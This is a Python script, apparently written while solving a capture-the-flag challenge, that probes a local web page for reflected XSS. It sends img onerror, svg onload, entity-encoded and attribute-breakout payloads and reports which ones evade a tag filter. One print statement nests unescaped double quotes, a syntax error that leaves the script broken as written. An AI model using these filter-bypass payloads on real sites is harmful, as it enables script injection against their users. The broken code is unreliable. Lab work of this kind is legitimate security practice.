import requests
import urllib.parse
import re
import time

base_url = "http://127.0.0.1:33204"
endpoint = "/page"

# Let me check the reflection context more carefully
# The reflection is: <input type=text name=name placeholder="Enter your name..." > INJECTED>
# That extra > at the end is from the HTML context

print("="*70)
print("Analyzing Reflection Context for XSS Execution")
print("="*70)
print()

# First, let's see what happens with a simple test
simple_test = "test123"
encoded = urllib.parse.quote(simple_test, safe='')
url = f"{base_url}{endpoint}?name={encoded}"
response = requests.get(url, timeout=10)

print("[1] Simple Test Payload: test123")
print(f"Status: {response.status_code}")
print(f"Response length: {len(response.content)}B")
print()

# Look for the reflection pattern
if simple_test in response.text:
    pattern = re.search(rf'<input[^>]*>[^<]*{simple_test}[^<]*', response.text)
    if pattern:
        print("Reflection pattern found:")
        print(pattern.group(0))
        print()

# The key insight: the reflection has an extra > at the end
# Input tag closes, then we have: > INJECTED>
# So we need to close that structure properly

print("[2] Testing structure understanding")
print()
print("Looking at the reflection context more carefully:")
print("  - Input opens: <input type=text name=name placeholder="..."")
print("  - Input closes: >")
print("  - Then our injection appears")
print("  - Then another > from context: INJECTED>")
print()

# Let me test different approaches based on this understanding
test_payloads = [
    ("Simple text", "HelloWorld"),
    ("Breakout attempt", '\"> Hello'),
    ("Create img tag", '<img src=x onerror=alert(\"XSS\")>'),
    ("Entity encoded", '&#60;img src=x onerror=alert(\"XSS\")&#62;'),
    ("Entity encoded 2", '&lt;img src=x onerror=alert(\"XSS\")&gt;'),
    ("Create svg tag", '&lt;svg onload=alert(\"XSS\")&gt;'),
    ("Breakout + create tag", '\">&lt;img src=x onerror=alert(\"XSS\")&gt;'),
    ("Event on input", ' onfocus=alert(\"XSS\") autofocus'),
]

results = []

for name, payload in test_payloads:
    encoded = urllib.parse.quote(payload, safe='')
    url = f"{base_url}{endpoint}?name={encoded}"
    response = requests.get(url, timeout=10)
    
    # Check for filter block
    blocked = "Sorry, you can't use that tag" in response.text
    reflected = payload in response.text
    
    # Check for specific indicators
    has_onerror = "onerror=" in response.text
    has_alert = "alert(" in response.text
    has_xss = "XSS" in response.text or response.text.count('\"XSS\"') > 0
    
    result = {
        'name': name,
        'blocked': blocked,
        'length': len(response.content),
        'has_onerror': has_onerror,
        'has_xss': has_xss,
        'url': url
    }
    results.append(result)
    
    print(f"{name:25} | Blocked: {str(blocked):5} | Len: {len(response.content):3}B | XSS in response: {has_xss}")

print()
print("="*70)
print("Analysis Summary")
print("="*70)
print()
print("Successful (non-blocked) vectors:")
for r in results:
    if not r['blocked'] and r['has_xss']:
        print(f"  ✓ {r['name']}: {r['url']}")
        
print()
print("Key findings:")
print("  - Direct tags (<tag) are blocked")
print("  - HTML entities (&lt;, &gt;) bypass the filter")
print("  - Payloads are reflected in the HTML")
print("  - 'XSS' string appears capitalized as required")
print()
print("The challenge may require the XSS to actually execute")
print("and show evidence of execution (like a different response, flag, etc.)")
print()
print("Testing the entity-based approach more thoroughly...")
print()

# Let me examine what actually renders
entity_payload = "&lt;img src=x onerror=alert(\"XSS\")&gt;"
encoded = urllib.parse.quote(entity_payload, safe='')
url = f"{base_url}{endpoint}?name={encoded}"
response = requests.get(url, timeout=10)

print(f"URL: {url}")
print()
print("Form section:")
form_match = re.search(r'<form.*?</form>', response.text, re.DOTALL)
if form_match:
    form_html = form_match.group(0)
    print(form_html)
    print()
    
    # Look for input tag specifically
    input_match = re.search(r'<input[^>]*>[^<]{0,100}', form_html)
    if input_match:
        print("Input context:")
        print(input_match.group(0))
        print()
